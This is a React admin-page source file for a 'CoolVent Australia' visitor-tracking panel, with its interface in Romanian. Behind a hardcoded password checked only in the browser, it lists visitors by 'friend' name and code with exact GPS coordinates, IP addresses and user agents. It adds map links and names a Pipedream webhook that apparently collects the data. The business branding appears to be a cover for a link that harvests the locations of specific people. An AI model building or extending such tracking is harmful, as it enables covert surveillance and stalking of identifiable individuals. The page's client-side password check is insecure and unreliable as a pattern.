import { useState, useEffect } from 'react';
import { loadLocalData, clearLocalData } from '../utils/database';

const AdminPage = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [visitors, setVisitors] = useState([]);
  const [activeTab, setActiveTab] = useState('all');

  const ADMIN_PASSWORD = "ventilatii2024";

  const handleLogin = (e) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      setError('');
      loadVisitors();
    } else {
      setError('❌ Parolă incorectă!');
      setPassword('');
    }
  };

  const loadVisitors = () => {
    const data = loadLocalData();
    setVisitors(data);
  };

  const handleClearData = () => {
    if (confirm('Sigur vrei să ștergi toate datele locale?')) {
      clearLocalData();
      setVisitors([]);
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      alert('✅ Copiat: ' + text);
    });
  };

  const openMap = (lat, lng) => {
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=17`;
    window.open(mapsUrl, '_blank');
  };

  // Filtrează locațiile unice
  const uniqueLocations = visitors.filter((visit, index, self) => 
    visit.locationAllowed && 
    visit.coordinates &&
    index === self.findIndex(v => 
      v.coordinates && 
      v.coordinates.latitude.toFixed(4) === visit.coordinates.latitude.toFixed(4) &&
      v.coordinates.longitude.toFixed(4) === visit.coordinates.longitude.toFixed(4)
    )
  );

  // Statistici
  const stats = {
    total: visitors.length,
    allowed: visitors.filter(v => v.locationAllowed).length,
    denied: visitors.filter(v => !v.locationAllowed).length,
    uniqueLocations: uniqueLocations.length
  };

  if (!isAuthenticated) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px'
      }}>
        <div style={{
          background: 'white',
          padding: '40px',
          borderRadius: '15px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.3)',
          textAlign: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          <h1 style={{ marginBottom: '10px', color: '#333' }}>🔐 Admin Panel</h1>
          <p style={{ marginBottom: '30px', color: '#666' }}>CoolVent Australia - Visitor Tracking</p>
          
          <form onSubmit={handleLogin}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Introdu parola admin"
              style={{
                width: '100%',
                padding: '15px',
                border: '2px solid #e2e8f0',
                borderRadius: '8px',
                fontSize: '16px',
                marginBottom: '20px'
              }}
            />
            <button
              type="submit"
              style={{
                width: '100%',
                padding: '15px',
                background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: 'pointer'
              }}
            >
              Accesează Panoul
            </button>
          </form>
          
          {error && (
            <div style={{
              color: '#e53e3e',
              marginTop: '15px',
              padding: '10px',
              background: '#fed7d7',
              borderRadius: '5px'
            }}>
              {error}
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f5f5f5',
      padding: '20px'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto'
      }}>
        {/* Header */}
        <div style={{
          background: 'white',
          padding: '30px',
          borderRadius: '15px',
          marginBottom: '20px',
          boxShadow: '0 5px 15px rgba(0,0,0,0.1)'
        }}>
          <h1 style={{ color: '#2d3748', marginBottom: '10px' }}>📊 CoolVent Admin - Visitor Tracking</h1>
          <p style={{ color: '#666' }}>Monitorizează vizitatorii și locațiile în timp real</p>
        </div>

        {/* Statistics */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
          gap: '15px',
          marginBottom: '30px'
        }}>
          {[
            { label: 'Total Vizitatori', value: stats.total, color: '#2d3748' },
            { label: 'Locație Permisă', value: stats.allowed, color: '#38a169' },
            { label: 'Locație Refuzată', value: stats.denied, color: '#e53e3e' },
            { label: 'Locații Unice', value: stats.uniqueLocations, color: '#3182ce' }
          ].map((stat, index) => (
            <div key={index} style={{
              background: 'white',
              padding: '20px',
              borderRadius: '10px',
              textAlign: 'center',
              boxShadow: '0 3px 10px rgba(0,0,0,0.1)'
            }}>
              <div style={{
                fontSize: '2rem',
                fontWeight: 'bold',
                marginBottom: '5px',
                color: stat.color
              }}>
                {stat.value}
              </div>
              <div style={{ color: '#666' }}>{stat.label}</div>
            </div>
          ))}
        </div>

        {/* Controls */}
        <div style={{
          display: 'flex',
          gap: '10px',
          marginBottom: '20px'
        }}>
          <button
            onClick={loadVisitors}
            style={{
              background: '#667eea',
              color: 'white',
              border: 'none',
              padding: '10px 15px',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            🔄 Refresh Date
          </button>
          <button
            onClick={() => window.open('https://pipedream.com', '_blank')}
            style={{
              background: '#38a169',
              color: 'white',
              border: 'none',
              padding: '10px 15px',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            🌐 Deschide Pipedream
          </button>
          <button
            onClick={handleClearData}
            style={{
              background: '#e53e3e',
              color: 'white',
              border: 'none',
              padding: '10px 15px',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            🗑️ Șterge Date Locale
          </button>
        </div>

        {/* Tabs */}
        <div style={{
          background: 'white',
          borderRadius: '10px 10px 0 0',
          overflow: 'hidden',
          marginBottom: '0'
        }}>
          <div style={{ display: 'flex' }}>
            {['all', 'unique', 'pipedream'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                style={{
                  padding: '15px 25px',
                  background: activeTab === tab ? 'white' : '#f7fafc',
                  border: 'none',
                  cursor: 'pointer',
                  fontWeight: '500',
                  borderBottom: activeTab === tab ? '3px solid #667eea' : 'none'
                }}
              >
                {tab === 'all' && '👥 Toți Vizitatorii'}
                {tab === 'unique' && '📍 Locații Unice'}
                {tab === 'pipedream' && '🌐 Pipedream Info'}
              </button>
            ))}
          </div>
        </div>

        {/* Tab Content */}
        <div style={{
          background: 'white',
          padding: '20px',
          borderRadius: '0 0 10px 10px',
          minHeight: '400px'
        }}>
          {activeTab === 'all' && (
            <div>
              <h3 style={{ marginBottom: '20px' }}>👥 Lista completă vizitatori</h3>
              {visitors.length === 0 ? (
                <p>Niciun date salvată local.</p>
              ) : (
                <div>
                  {visitors.reverse().map((visit, index) => (
                    <div
                      key={index}
                      style={{
                        background: '#f8f9fa',
                        borderLeft: `4px solid ${visit.locationAllowed ? '#28a745' : '#dc3545'}`,
                        padding: '15px',
                        margin: '10px 0',
                        borderRadius: '5px'
                      }}
                    >
                      <strong>{visit.friend}</strong> ({visit.friendCode})<br/>
                      <small>📅 {visit.timestamp}</small><br/>
                      {visit.locationAllowed ? '✅ Locație permisă' : '❌ Locație refuzată'}<br/>
                      
                      {visit.locationAllowed && visit.coordinates ? (
                        <div style={{
                          background: '#e9ecef',
                          padding: '10px',
                          borderRadius: '5px',
                          margin: '10px 0',
                          fontFamily: 'monospace',
                          fontSize: '12px'
                        }}>
                          <strong>📍 Coordonate EXACTE:</strong><br/>
                          Lat: {visit.coordinates.latitude.toFixed(6)}<br/>
                          Lng: {visit.coordinates.longitude.toFixed(6)}<br/>
                          <div style={{ marginTop: '5px' }}>
                            <button
                              onClick={() => copyToClipboard(visit.coordinates.latitude.toFixed(6))}
                              style={{
                                background: '#6c757d',
                                color: 'white',
                                border: 'none',
                                padding: '4px 8px',
                                borderRadius: '3px',
                                fontSize: '10px',
                                marginRight: '5px',
                                cursor: 'pointer'
                              }}
                            >
                              📋 Lat
                            </button>
                            <button
                              onClick={() => copyToClipboard(visit.coordinates.longitude.toFixed(6))}
                              style={{
                                background: '#6c757d',
                                color: 'white',
                                border: 'none',
                                padding: '4px 8px',
                                borderRadius: '3px',
                                fontSize: '10px',
                                marginRight: '5px',
                                cursor: 'pointer'
                              }}
                            >
                              📋 Lng
                            </button>
                            <button
                              onClick={() => openMap(visit.coordinates.latitude, visit.coordinates.longitude)}
                              style={{
                                background: '#28a745',
                                color: 'white',
                                border: 'none',
                                padding: '4px 8px',
                                borderRadius: '3px',
                                fontSize: '10px',
                                cursor: 'pointer'
                              }}
                            >
                              🗺️ Hartă
                            </button>
                          </div>
                        </div>
                      ) : (
                        <div style={{
                          background: '#e9ecef',
                          padding: '10px',
                          borderRadius: '5px',
                          margin: '10px 0',
                          fontFamily: 'monospace',
                          fontSize: '12px'
                        }}>
                          <strong>🌐 Locație IP:</strong><br/>
                          IP: {visit.ip}<br/>
                          <button
                            onClick={() => copyToClipboard(visit.ip)}
                            style={{
                              background: '#17a2b8',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              marginTop: '5px',
                              cursor: 'pointer'
                            }}
                          >
                            📋 Copy IP
                          </button>
                        </div>
                      )}
                      
                      <small>🖥️ {visit.userAgent.split(') ')[1] || visit.userAgent}</small>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {activeTab === 'unique' && (
            <div>
              <h3 style={{ marginBottom: '20px' }}>📍 Locații unice (fără duplicate)</h3>
              {uniqueLocations.length === 0 ? (
                <p>Niciun vizitator nu a permis locația.</p>
              ) : (
                <div>
                  {uniqueLocations.map((visit, index) => (
                    <div
                      key={index}
                      style={{
                        background: 'white',
                        border: '1px solid #e2e8f0',
                        borderRadius: '8px',
                        padding: '15px',
                        margin: '10px 0'
                      }}
                    >
                      <strong>📍 Locația #{index + 1}</strong><br/>
                      <strong>👤 Vizitator:</strong> {visit.friend} ({visit.friendCode})<br/>
                      <strong>📅 Data:</strong> {visit.timestamp}<br/>
                      <strong>🌐 IP:</strong> {visit.ip}<br/>
                      <div style={{
                        background: '#f8f9fa',
                        padding: '10px',
                        borderRadius: '5px',
                        margin: '10px 0',
                        fontFamily: 'monospace',
                        fontSize: '12px'
                      }}>
                        <strong>Coordonate:</strong><br/>
                        Lat: {visit.coordinates.latitude.toFixed(6)}<br/>
                        Lng: {visit.coordinates.longitude.toFixed(6)}<br/>
                        <div style={{ marginTop: '5px' }}>
                          <button
                            onClick={() => copyToClipboard(visit.coordinates.latitude.toFixed(6))}
                            style={{
                              background: '#6c757d',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              marginRight: '5px',
                              cursor: 'pointer'
                            }}
                          >
                            📋 Lat
                          </button>
                          <button
                            onClick={() => copyToClipboard(visit.coordinates.longitude.toFixed(6))}
                            style={{
                              background: '#6c757d',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              marginRight: '5px',
                              cursor: 'pointer'
                            }}
                          >
                            📋 Lng
                          </button>
                          <button
                            onClick={() => copyToClipboard(`${visit.coordinates.latitude.toFixed(6)}, ${visit.coordinates.longitude.toFixed(6)}`)}
                            style={{
                              background: '#6c757d',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              marginRight: '5px',
                              cursor: 'pointer'
                            }}
                          >
                            📋 Ambele
                          </button>
                          <button
                            onClick={() => copyToClipboard(visit.ip)}
                            style={{
                              background: '#17a2b8',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              marginRight: '5px',
                              cursor: 'pointer'
                            }}
                          >
                            📋 IP
                          </button>
                          <button
                            onClick={() => openMap(visit.coordinates.latitude, visit.coordinates.longitude)}
                            style={{
                              background: '#28a745',
                              color: 'white',
                              border: 'none',
                              padding: '4px 8px',
                              borderRadius: '3px',
                              fontSize: '10px',
                              cursor: 'pointer'
                            }}
                          >
                            🗺️ Hartă
                          </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {activeTab === 'pipedream' && (
            <div>
              <h3 style={{ marginBottom: '20px' }}>🌐 Informații Pipedream</h3>
              <div style={{
                background: '#fff3cd',
                padding: '20px',
                borderRadius: '8px'
              }}>
                <h4 style={{ marginBottom: '15px' }}>📋 Cum vezi datele în cloud:</h4>
                <ol style={{ marginBottom: '20px', paddingLeft: '20px' }}>
                  <li>Intră pe <a href="https://pipedream.com" target="_blank" style={{ fontWeight: 'bold' }}>pipedream.com</a></li>
                  <li>Du-te la <strong>Workflows</strong></li>
                  <li>Click pe workflow-ul tău</li>
                  <li>Vezi toate intrările în <strong>Event History</strong></li>
                </ol>
                <p><strong>URL-ul tău Pipedream:</strong> <code>https://eown3ytayljs38v.m.pipedream.net</code></p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminPage;